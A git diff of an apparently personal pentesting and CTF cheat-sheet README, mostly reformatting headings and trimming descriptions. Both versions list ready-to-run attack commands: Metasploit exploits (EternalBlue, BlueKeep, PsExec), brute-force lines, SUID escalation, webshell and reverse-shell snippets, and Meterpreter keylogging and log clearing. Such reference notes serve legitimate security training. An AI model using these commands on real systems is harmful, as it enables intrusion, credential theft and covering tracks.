@@ -1,27 +1,29 @@
 # 🛠️ Hacking Notes by Xavi
 
-This is my personal knowledge base for offensive security, pentesting, OSINT, and red team tactics. These notes are built from real investigations, research, and technical exercises — used during CTFs, labs, and private assessments.
+This is my personal knowledge base for offensive security, pentesting, OSINT, and red‑team tactics. These notes are built from real investigations, research, and technical exercises — used during CTFs, labs, and private assessments.
 
-> 📌 I use this repo for quick recall during engagements, training, and tool development. It's a practical-first collection of syntax, techniques, and workflows I actually rely on.
+> 📌 I use this repo for quick recall during engagements, training, and tool development. It's a practical‑first collection of syntax, techniques, and workflows I actually rely on.
 
 ---
 
 ## 🧠 What's Inside?
 
-These notes are meant to be lightweight, focused, and copy-paste friendly. Topics include:
+These notes are meant to be lightweight, focused, and copy‑paste friendly. Topics include:
 
-- 🔍 **Enumeration & Recon**: Nmap, Gobuster, DNS, subdomain fuzzing, Shodan, more
-- 🎯 **Exploitation & Payloads**: Web attacks (SQLi, XSS), CVE usage, Metasploit, SSRF, IDOR, RCE
-- 🔐 **Post-Exploitation**: Shells, privilege escalation (Linux/Windows), persistence
-- 🗂️ **Protocol & Service Attacks**: SSH, SMB, RDP, FTP, MySQL, and more
-- 🧰 **Tool Quick References**: netcat, Hydra, wafw00f, curl, dig, enum4linux, etc.
-- 🌐 **OSINT & External Intelligence**: Footprinting, email leaks, breach lookups, metadata collection
-
-# Hacking Notes
+* 🔍 **[Enumeration & Recon](#common-ports)** – Nmap, Gobuster, DNS, subdomain fuzzing, Shodan, more
+* 🎯 **[Exploitation & Payloads](#exploits--scanners)** – Web attacks (SQLi, XSS), CVE usage, Metasploit, SSRF, IDOR, RCE
+* 🔐 **[Post‑Exploitation](#privilege-escalation)** – Shells, privilege escalation (Linux/Windows), persistence
+* 🗂️ **[Protocol & Service Attacks](#smb-examples)** – SSH, SMB, RDP, FTP, MySQL, and more
+* 🧰 **[Tool Quick References](#configuration-files--tools)** – netcat, Hydra, wafw00f, curl, dig, enum4linux, etc.
+* 🌐 **OSINT & External Intelligence** – Footprinting, email leaks, breach lookups, metadata collection (coming soon)
 
 ---
 
-## Common Ports
+## Hacking Notes Cheat Sheet
+
+Below is the full cheat‑sheet of commands and mini‑guides you can jump through using the links above:
+
+### Common Ports
 
 | Port    | Protocol | Service / Description            |
 | ------- | -------- | -------------------------------- |
@@ -42,7 +44,7 @@ These notes are meant to be lightweight, focused, and copy-paste friendly. Topic
 | 162     | UDP      | SNMP Trap                        |
 | 389     | TCP/UDP  | LDAP                             |
 | 443     | TCP      | HTTPS                            |
-| 445     | TCP      | Microsoft-DS (SMB over TCP)      |
+| 445     | TCP      | Microsoft‑DS (SMB over TCP)      |
 | 465     | TCP      | SMTPS (SMTP over SSL/TLS)        |
 | 514     | UDP      | Syslog                           |
 | 520     | UDP      | RIP                              |
@@ -55,11 +57,11 @@ These notes are meant to be lightweight, focused, and copy-paste friendly. Topic
 | 3306    | TCP      | MySQL                            |
 | 3389    | TCP/UDP  | RDP                              |
 | 5900    | TCP      | VNC                              |
-| 8080    | TCP      | HTTP-alt                         |
+| 8080    | TCP      | HTTP‑alt                         |
 
 ---
 
-## Configuration Files & Tools
+### Configuration Files & Tools
 
 | Description             | Command | Syntax                  |
 | ----------------------- | ------- | ----------------------- |
@@ -69,7 +71,7 @@ These notes are meant to be lightweight, focused, and copy-paste friendly. Topic
 
 ---
 
-## Nmap Banner & Version Scanning Examples
+### Nmap Banner & Version Scanning Examples
 
 ```bash
 # 1. Version + banner grab
@@ -105,9 +107,9 @@ nmap -sV --version-intensity 9 --script "version and" <target>
 
 ---
 
-## WMAP (Web Scanner in Metasploit)
+### WMAP (Web Scanner in Metasploit)
 
-Scan web applications for common vulnerabilities using Metasploit's built-in WMAP module.
+Scan web applications for common vulnerabilities using Metasploit's built‑in WMAP module.
 
 ```bash
 # Start Metasploit
@@ -134,7 +136,7 @@ wmap_modules -e auxiliary/scanner/http/dir_scanner
 
 ---
 
-## WebDAV Discovery & Upload with DAVTest
+### WebDAV Discovery & Upload with DAVTest
 
 ```bash
 davtest -url http://<target>/webdav/ -methods all -upload
@@ -142,7 +144,7 @@ davtest -url http://<target>/webdav/ -methods all -upload
 
 ---
 
-## Interactive WebDAV with Cadaver (upload shell.asp)
+### Interactive WebDAV with Cadaver (upload shell.asp)
 
 ```bash
 cadaver http://<target>/webdav/ << 'EOF'
@@ -152,7 +154,7 @@ EOF
 
 ---
 
-## Create ASP Webshell (shell.asp)
+### Create ASP Webshell (shell.asp)
 
 ```bash
 cat << 'EOF' > shell.asp
@@ -167,13 +169,13 @@ cat << 'EOF' > shell.asp
 EOF
 ```
 
-### Execute Webshell
+#### Execute Webshell
 
 Browse to: `http://<target>/webdav/shell.asp?cmd=whoami`
 
 ---
 
-## IIS WebDAV ASP Upload (CVE-2017-7269)
+### IIS WebDAV ASP Upload (CVE‑2017‑7269)
 
 ```bash
 msfconsole -q
@@ -190,35 +192,26 @@ set PATH /webdav/%RAND%.asp
 
 ---
 
-## PsExec SMB Remote Code Execution
+### PsExec SMB Remote Code Execution
 
-Leverages valid SMB credentials to remotely execute commands on a Windows machine using the **PsExec** technique. This method does **not exploit a vulnerability**, but instead uses **legitimate admin access** over SMB (port 445) to gain a foothold or move laterally.
+Leverages valid SMB credentials to remotely execute commands on a Windows machine using the **PsExec** technique.
 
 ```bash
-# Start Metasploit without banner (quieter startup)
 msfconsole -q
-
-# Load PsExec exploit module
 use exploit/windows/smb/psexec
-
-# Set the remote target
-set RHOSTS <target-ip-or-host>
-
-# Provide SMB credentials (must be a local admin on the target)
+set RHOSTS <target>
 set SMBUser <username>
 set SMBPass <password>
-
-# Launch the exploit (starts a session)
 exploit
 ```
 
 ---
 
-## RDP Brute Force and Enumeration
+### RDP Brute Force and Enumeration
 
 | Task / Step                          | Command / Syntax |
 | ------------------------------------ | ---------------- |
-| **Brute-force RDP login with Hydra** | \`\`\`bash       |
+| **Brute‑force RDP login with Hydra** | \`\`\`bash       |
 | hydra -L /path/to/userlist.txt \\    |                  |
 
 ```
@@ -232,12 +225,12 @@ use auxiliary/scanner/rdp/rdp_scanner
 set RHOSTS [TARGET]
 run
 ``` |
-| **Scan for BlueKeep (CVE-2019-0708)** | ```bash
+| **Scan for BlueKeep (CVE‑2019‑0708)** | ```bash
 use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
 set RHOSTS [TARGET]
 run
 ``` |
-| **Exploit BlueKeep (RCE)** *(optional)* | ```bash
+| **Exploit BlueKeep (RCE)** (optional) | ```bash
 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 set RHOSTS [TARGET]
 set RPORT 3389
@@ -247,13 +240,13 @@ set LHOST [YOUR-IP]
 set LPORT 4444
 exploit
 ``` |
-| **Connect using xfreerdp** *(if creds found)* | ```bash
+| **Connect using xfreerdp** | ```bash
 xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]
 ``` |
 
 ---
 
-## Directory Discovery with Gobuster
+### Directory Discovery with Gobuster
 
 | Description | Command |
 | --- | --- |
@@ -262,7 +255,7 @@ xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]
 
 ---
 
-## Web & Content Discovery
+### Web & Content Discovery
 
 | Description | Command | Syntax |
 | --- | --- | --- |
@@ -270,7 +263,7 @@ xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]
 
 ---
 
-## File/Data Analysis
+### File/Data Analysis
 
 | Description | Command | Syntax |
 | --- | --- | --- |
@@ -278,7 +271,7 @@ xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]
 
 ---
 
-## WordPress Recon
+### WordPress Recon
 
 | Description | Examples/Paths |
 | --- | --- |
@@ -286,7 +279,7 @@ xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]
 
 ---
 
-## Access
+### Access
 
 | Service | Command Syntax |
 | --- | --- |
@@ -297,7 +290,7 @@ xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]
 
 ---
 
-## Dictionary & Wordlist Generation
+### Dictionary & Wordlist Generation
 
 | Tool | Command | Syntax |
 | --- | --- | --- |
@@ -305,7 +298,7 @@ xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]
 
 ---
 
-## Bruteforce Attacks
+### Bruteforce Attacks
 
 | Tool | Description | Syntax |
 | --- | --- | --- |
@@ -314,7 +307,7 @@ xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]
 
 ---
 
-## Privilege Escalation
+### Privilege Escalation
 
 | Task | Command / Path |
 | --- | --- |
@@ -326,7 +319,7 @@ xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]
 | Find SUID exploit | `find . -exec /bin/sh -p \; -quit` |
 | Make binary SUID | `chmod u+s /tmp/bash` |
 
-### PHP Reverse Shell Example
+#### PHP Reverse Shell Example
 
 ```php
 <?php
@@ -336,11 +329,11 @@ if (isset($_GET['trigger'])) {
 ?>
 ````
 
-Access at: `http://[IP]/wp-content/themes/[THEME]/404.php?trigger=1`
+Access: `http://[IP]/wp-content/themes/[THEME]/404.php?trigger=1`
 
 ---
 
-## Binary Exploits (Python)
+### Binary Exploits (Python)
 
 ```python
 import os
@@ -350,7 +343,7 @@ os.system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash")
 
 ---
 
-## Escape Restricted Shell
+### Escape Restricted Shell
 
 | Method     | Command                                           |
 | ---------- | ------------------------------------------------- |
@@ -359,7 +352,7 @@ os.system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash")
 
 ---
 
-## Process Snooping Without Root
+### Process Snooping Without Root
 
 | Tool | Description       | Command/Source                                                           |
 | ---- | ----------------- | ------------------------------------------------------------------------ |
@@ -367,7 +360,7 @@ os.system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash")
 
 ---
 
-## Port Scanning One-Liner (Python)
+### Port Scanning One‑Liner (Python)
 
 ```python
 python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list(ipaddress.IPv4Network("10.10.10.0/24").hosts())[100:200] for p in range(1,65535) if not socket.socket().connect_ex((str(ip),p))]'
@@ -375,7 +368,7 @@ python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list
 
 ---
 
-## SSH Tunneling
+### SSH Tunneling
 
 | Task           | Syntax                      |
 | -------------- | --------------------------- |
@@ -383,7 +376,7 @@ python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list
 
 ---
 
-## Local File Inclusion - Base64 Read
+### Local File Inclusion – Base64 Read
 
 | Task               | URL Example                                                                  |
 | ------------------ | ---------------------------------------------------------------------------- |
@@ -391,7 +384,7 @@ python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list
 
 ---
 
-## Metasploit Basics
+### Metasploit Basics
 
 | Task                  | Command                  |
 | --------------------- | ------------------------ |
@@ -408,90 +401,69 @@ python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list
 
 ---
 
-## Meterpreter Commands
+### Meterpreter Commands
 
-| Command              | Description                                     |
-| -------------------- | ----------------------------------------------- |
-| `help`               | Show all available Meterpreter commands         |
-| `sysinfo`            | Get target system information                   |
-| `getuid`             | Display current user ID                         |
-| `ipconfig`           | Show network interfaces of the victim           |
-| `ifconfig`           | Same as above (alias)                           |
-| `shell`              | Drop into a standard command shell              |
-| `background`         | Send Meterpreter session to background          |
-| `sessions`           | List all active sessions                        |
-| `sessions -i [ID]`   | Interact with a specific session                |
-| `upload [src] [dst]` | Upload file to the target                       |
-| `download [src]`     | Download file from the target                   |
-| `edit [file]`        | Open a file on target in an editor              |
-| `cat [file]`         | Output contents of a file                       |
-| `pwd`                | Print working directory on the target           |
-| `cd [dir]`           | Change directory on the target                  |
-| `ls`                 | List files in the current directory             |
-| `ps`                 | List running processes                          |
-| `migrate [PID]`      | Migrate to another process (for stability)      |
-| `getprivs`           | Enumerate current session privileges            |
-| `use stdapi`         | Load standard API (if not loaded automatically) |
-| `keyscan_start`      | Start keylogger                                 |
-| `keyscan_dump`       | Dump recorded keystrokes                        |
-| `screenshot`         | Take a screenshot of the victim desktop         |
-| `webcam_list`        | List available webcams                          |
-| `webcam_snap`        | Take a snapshot using the webcam                |
-| `record_mic`         | Record microphone audio                         |
-| `hashdump`           | Dump password hashes (if permissions allow)     |
-| `clearev`            | Clear event logs on the target                  |
-
----
-
-## MySQL Auxiliary Modules
-
-* **auxiliary/scanner/mysql/mysql\_version**
-  Connects to a MySQL server and retrieves its version banner. Useful to determine if the target is running a vulnerable version.
-
-* **auxiliary/scanner/mysql/mysql\_login**
-  Attempts to log in to MySQL using a supplied username/password (or a password list). Helps identify valid credentials.
-
-* **auxiliary/admin/mysql/mysql\_enum**
-  Gathers general MySQL information: users, databases, privileges, and version. Great for mapping out the target’s schema and user base.
-
-* **auxiliary/admin/mysql/mysql\_sql**
-  Allows you to run arbitrary SQL queries on the target once authenticated. Enables custom data extraction or manipulation.
-
-* **auxiliary/scanner/mysql/mysql\_file\_enum**
-  Tries to enumerate files on the database host by exploiting MySQL’s `LOAD_FILE()` function. Can reveal configuration files, credentials, etc.
-
-* **auxiliary/scanner/mysql/mysql\_hashdump**
-  After authenticating, retrieves stored password hashes from the `mysql.user` table. These can then be cracked offline.
-
-* **auxiliary/scanner/mysql/mysql\_schemadump**
-  Connects and dumps schema metadata (tables, columns, types) across all databases. Builds a full picture of the database structure.
-
-* **auxiliary/scanner/mysql/mysql\_writable\_dirs**
-  Enumerates directories on the MySQL server host where the `INTO OUTFILE` command is permitted. Useful for writing files (e.g., web shells) to disk.
+| Command              | Description                                   |
+| -------------------- | --------------------------------------------- |
+| `help`               | Show all available Meterpreter commands       |
+| `sysinfo`            | Get target system information                 |
+| `getuid`             | Display current user ID                       |
+| `ipconfig`           | Show network interfaces of the victim         |
+| `ifconfig`           | Same as above (alias)                         |
+| `shell`              | Drop into a standard command shell            |
+| `background`         | Send Meterpreter session to background        |
+| `sessions`           | List all active sessions                      |
+| `sessions -i [ID]`   | Interact with a specific session              |
+| `upload [src] [dst]` | Upload file to the target                     |
+| `download [src]`     | Download file from the target                 |
+| `edit [file]`        | Open a file on target in an editor            |
+| `cat [file]`         | Output contents of a file                     |
+| `pwd`                | Print working directory on the target         |
+| `cd [dir]`           | Change directory on the target                |
+| `ls`                 | List files in the current directory           |
+| `ps`                 | List running processes                        |
+| `migrate [PID]`      | Migrate to another process                    |
+| `getprivs`           | Enumerate current session privileges          |
+| `use stdapi`         | Load standard API if not loaded automatically |
+| `keyscan_start`      | Start keylogger                               |
+| `keyscan_dump`       | Dump recorded keystrokes                      |
+| `screenshot`         | Take screenshot of the desktop                |
+| `webcam_list`        | List webcams                                  |
+| `webcam_snap`        | Take webcam snapshot                          |
+| `record_mic`         | Record microphone audio                       |
+| `hashdump`           | Dump password hashes                          |
+| `clearev`            | Clear event logs                              |
 
 ---
 
-## SSH Auxiliary Modules
+### MySQL Auxiliary Modules
 
-* **auxiliary/scanner/ssh/ssh\_version**
-  Connects to an SSH service and retrieves the version banner (SSH protocol version, server software and version). Helps identify outdated or vulnerable SSH implementations.
-
-* **auxiliary/scanner/ssh/ssh\_login**
-  Attempts to authenticate to SSH using a supplied username/password or a password list. Useful for discovering weak or default credentials.
-
----
-
-## FTP Auxiliary Modules
-
-* **auxiliary/scanner/ftp/ftp\_version**
-  Connects to an FTP service and retrieves its version banner (FTP server software and version). Helps identify outdated or vulnerable FTP implementations.
-
-* **auxiliary/scanner/ftp/ftp\_login**
-  Attempts to authenticate to FTP using a supplied username/password or a password list. Useful for discovering weak or default credentials.
+* **auxiliary/scanner/mysql/mysql\_version** – Retrieves MySQL version banner.
+* **auxiliary/scanner/mysql/mysql\_login** – Brute‑force login.
+* **auxiliary/admin/mysql/mysql\_enum** – Enumerate users/databases/privileges.
+* **auxiliary/admin/mysql/mysql\_sql** – Run arbitrary SQL after auth.
+* **auxiliary/scanner/mysql/mysql\_file\_enum** – Enumerate files via `LOAD_FILE()`.
+* **auxiliary/scanner/mysql/mysql\_hashdump** – Dump password hashes.
+* **auxiliary/scanner/mysql/mysql\_schemadump** – Dump schema metadata.
+* **auxiliary/scanner/mysql/mysql\_writable\_dirs** – Find writable dirs via `INTO OUTFILE`.
 
 ---
 
-## SMB Examples
+### SSH Auxiliary Modules
+
+* **auxiliary/scanner/ssh/ssh\_version** – Grab SSH banner.
+* **auxiliary/scanner/ssh/ssh\_login** – Brute‑force SSH credentials.
+
+---
+
+### FTP Auxiliary Modules
+
+* **auxiliary/scanner/ftp/ftp\_version** – Grab FTP banner.
+* **auxiliary/scanner/ftp/ftp\_login** – Brute‑force FTP credentials.
+
+---
+
+### SMB Examples
 
 | Task           | Command                                   |
 | -------------- | ----------------------------------------- |
@@ -501,7 +473,7 @@ python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list
 
 ---
 
-## Cleanup and File Checks
+### Cleanup and File Checks
 
 | Task                  | Command                               |
 | --------------------- | ------------------------------------- |
@@ -512,27 +484,23 @@ python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list
 
 ---
 
-## Exploits & Scanners
+### Exploits & Scanners
 
-| Name                         | CVE           | Tool       | Command                                                                                     | Port   |
-| ---------------------------- | ------------- | ---------- | ------------------------------------------------------------------------------------------- | ------ |
-| Shellshock (Apache mod\_cgi) | CVE-2014-6271 | Metasploit | `use exploit/multi/http/apache_mod_cgi_bash_env_exec`<br>`set RHOSTS <target>`<br>`exploit` | 80/443 |
-| EternalBlue SMB Exploit      | CVE-2017-0144 | Metasploit | `use exploit/windows/smb/ms17_010_eternalblue`<br>`set RHOSTS <target>`<br>`exploit`        | 445    |
-| BlueKeep RDP Exploit         | CVE-2019-0708 | Metasploit | `use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`<br>`set RHOSTS <target>`<br>`exploit`  | 3389   |
-| BlueKeep RDP Scanner         | (N/A)         | Nmap       | `nmap -p3389 --script rdpscan --script-args rdpscan.hosts=<target>`                         | 3389   |
-
----
-
-## WinRM Enumeration and Access
-
-| Tool             | Description                             | Command / Syntax                                                            |
-| ---------------- | --------------------------------------- | --------------------------------------------------------------------------- |
-| **crackmapexec** | Brute-force WinRM auth via domain creds | `crackmapexec winrm [TARGET] -d [DOMAIN] -u usernames.txt -p passwords.txt` |
-| **evil-winrm**   | Remote access with valid credentials    | `evil-winrm -i [TARGET] -u [USER] -p [PASS] -d [DOMAIN]`                    |
+| Name                         | CVE           | Tool       | Command                                                             | Port   |
+| ---------------------------- | ------------- | ---------- | ------------------------------------------------------------------- | ------ |
+| Shellshock (Apache mod\_cgi) | CVE‑2014‑6271 | Metasploit | `use exploit/multi/http/apache_mod_cgi_bash_env_exec` → `exploit`   | 80/443 |
+| EternalBlue SMB Exploit      | CVE‑2017‑0144 | Metasploit | `use exploit/windows/smb/ms17_010_eternalblue` → `exploit`          | 445    |
+| BlueKeep RDP Exploit         | CVE‑2019‑0708 | Metasploit | `use exploit/windows/rdp/cve_2019_0708_bluekeep_rce` → `exploit`    | 3389   |
+| BlueKeep RDP Scanner         | —             | Nmap       | `nmap -p3389 --script rdpscan --script-args rdpscan.hosts=<target>` | 3389   |
 
 ---
 
+### WinRM Enumeration and Access
 
+| Tool         | Description                        | Command / Syntax                                                            |
+| ------------ | ---------------------------------- | --------------------------------------------------------------------------- |
+| crackmapexec | Brute‑force WinRM via domain creds | `crackmapexec winrm [TARGET] -d [DOMAIN] -u usernames.txt -p passwords.txt` |
+| evil-winrm   | Remote access with creds           | `evil-winrm -i [TARGET] -u [USER] -p [PASS] -d [DOMAIN]`                    |
 
 ---
 
@@ -540,15 +508,15 @@ python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list
 
 I'm an information security specialist focused on technical execution and practical outcomes. My background includes:
 
-- Cybersecurity tools deployment and management
-- OSINT investigations 
-- Vulnerability assessment and advisory for infrastructure and cloud
-- System monitoring, project coordination, and tooling automation
-- Passion for offensive security, AI in cybersecurity, and security education
+* Cybersecurity tools deployment and management
+* OSINT investigations
+* Vulnerability assessment and advisory for infrastructure and cloud
+* System monitoring, project coordination, and tooling automation
+* Passion for offensive security, AI in cybersecurity, and security education
 
-🎓 Currently pursuing a degree in Computer Science with Artificial Intelligence  
-☁️ AWS Certified Security – Specialty  
-🧠 Ocasional Osint HTB user and CTF player
+🎓 Currently pursuing a degree in Computer Science with Artificial Intelligence
+☁️ AWS Certified Security – Specialty
+🧠 Occasional OSINT HTB user and CTF player
 
 🔗 [LinkedIn](https://www.linkedin.com/in/xavibages/) | [Hack The Box](https://app.hackthebox.com/users/289946)
 
@@ -558,23 +526,21 @@ I'm an information security specialist focused on technical execution and practi
 
 This repo helps me:
 
-- Avoid Googling the same payloads and tools
-- Organize what I actually use in investigations
-- Prepare for certs, interviews, and internal projects
-- Share practical knowledge with peers and students
-
-You're welcome to fork, reuse, or suggest improvements.
+* Avoid Googling the same payloads and tools
+* Organize what I actually use in investigations
+* Prepare for certs, interviews, and internal projects
+* Share practical knowledge with peers and students
 
 ---
 
 ## ⚠️ Ethical Use Notice
+
 All content in this repository is shared for legitimate educational and research purposes. Use this information responsibly, only within authorized environments such as labs, test systems, or CTF platforms. Unauthorized use may be illegal and unethical.
 
 ---
 
 ## 📄 License
 
-This project is licensed under the **Apache License 2.0**.  
-You are free to use, modify, and distribute the content, provided you retain proper attribution and include a copy of the license.
+This project is licensed under the **Apache License 2.0**.
 
 [View Full License »](https://www.apache.org/licenses/LICENSE-2.0)
